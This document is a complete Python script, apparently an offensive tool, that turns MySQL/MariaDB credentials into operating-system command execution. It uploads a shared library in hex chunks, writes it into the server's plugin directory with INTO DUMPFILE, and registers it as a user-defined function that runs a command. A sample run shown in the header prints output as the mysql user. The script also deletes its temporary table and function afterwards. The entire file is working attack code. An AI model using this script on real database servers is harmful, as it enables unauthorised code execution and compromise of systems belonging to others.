#!python3

# MySql - MariaDB UDF file upload and code execution

# $ python3 mysql-udf-upload.py
# [.] Starting...
# [.] Loading local file (call_system.so)
# [+] The local file was successfully loaded.
# [+] Connected
# [+] Table created
# [.] Starting upload
# [+] Uploading block no. 0
# [+] Uploading block no. 1
# [+] Uploading block no. 2
# [+] Uploading block no. 3
# [+] Uploading block no. 4
# [+] Uploading block no. 5
# [+] Uploading block no. 6
# [+] Uploading block no. 7
# [+] Upload finished to database
# [+] File exported, to /usr/lib/mysql/plugin/call_system.so
# [+] Table deleted
# [+] Function created call_system
# [+] Results:
# uid=104(mysql) gid=110(mysql) groups=110(mysql)

# [+] Function deleted

import pymysql
import sys
import string
import random
import math

# ___BEGGINING_OF_CONFIG___
CONFIG_DB_HOST = "127.0.0.1"
CONFIG_DB_PORT = 3306
CONFIG_DB_DATABASE = "test_db"
CONFIG_DB_USER = "admin"
CONFIG_DB_PASSWORD = "password"

CONFIG_FUNCTION_NAME = "call_system"
CONFIG_PATH_TO_UDF = "call_system.so"
CONFIG_REMOTE_DIRECTORY = "/usr/lib/mysql/plugin"

CONFIG_CMD = "id"
# ___END_OF_CONFIG___

BLOCK_LENGTH = 2048
TABLE_NAME = "tmp_" + "".join(random.choice(string.ascii_letters) for x in range(16))
UDF_NAME = "call_system.so"

print("[.] Starting...")

print("[.] Loading local file ({localPath})".format(localPath=CONFIG_PATH_TO_UDF))
try:
    data = open(CONFIG_PATH_TO_UDF, "rb").read()

except Exception as e:
    print("[-] Some errors occurred reading in the local file.")
    print(e)
    exit(1)

else:
    print("[+] The local file was successfully loaded.")

try:
    dbConnection = pymysql.connect(
        host=CONFIG_DB_HOST,
        port=CONFIG_DB_PORT,
        database=CONFIG_DB_DATABASE,
        user=CONFIG_DB_USER,
        password=CONFIG_DB_PASSWORD,
    )
    dbCursor = dbConnection.cursor()
    print("[+] Connected")

    dbCursor.execute(
        "CREATE TABLE {tableName} (id INT, line LONGBLOB);".format(tableName=TABLE_NAME)
    )
    print("[+] Table created")

    print("[.] Starting upload")
    for blockNo in range(math.ceil(len(data) / BLOCK_LENGTH)):
        print("[+] Uploading block no.", blockNo)
        dbCursor.execute(
            "INSERT HIGH_PRIORITY INTO {tableName} (id,line) VALUES ({blockNo},unhex('{hexData}'));".format(
                tableName=TABLE_NAME,
                blockNo=blockNo,
                hexData=data[
                    blockNo * BLOCK_LENGTH : (blockNo + 1) * BLOCK_LENGTH
                ].hex(),
            )
        )
    print("[+] Upload finished to database")

    dbCursor.execute(
        "SELECT GROUP_CONCAT(line SEPARATOR '') INTO DUMPFILE '{exportPath}' FROM {tableName};".format(
            tableName=TABLE_NAME,
            exportPath=CONFIG_REMOTE_DIRECTORY + "/" + UDF_NAME,
        )
    )
    print("[+] File exported, to", CONFIG_REMOTE_DIRECTORY + "/" + UDF_NAME)

    dbCursor.execute("DROP TABLE {tableName};".format(tableName=TABLE_NAME))
    print("[+] Table deleted")

    dbCursor.execute(
        "CREATE FUNCTION {functionName} RETURNS STRING SONAME '{UDF_name}';".format(
            UDF_name=UDF_NAME,
            functionName=CONFIG_FUNCTION_NAME,
        )
    )
    print("[+] Function created", CONFIG_FUNCTION_NAME)

    dbCursor.execute(
        "SELECT {functionName}('{cmd}')".format(
            functionName=CONFIG_FUNCTION_NAME, cmd=CONFIG_CMD
        )
    )
    print("[+] Results:")
    print((dbCursor.fetchall()[0][0]).decode("utf-8"))

    dbCursor.execute(
        "DROP FUNCTION {functionName}".format(functionName=CONFIG_FUNCTION_NAME)
    )
    print("[+] Function deleted")


except Exception as e:
    print("[!] Some errors occurred.")
    print(e)

finally:
    dbCursor.close()
    dbConnection.close()
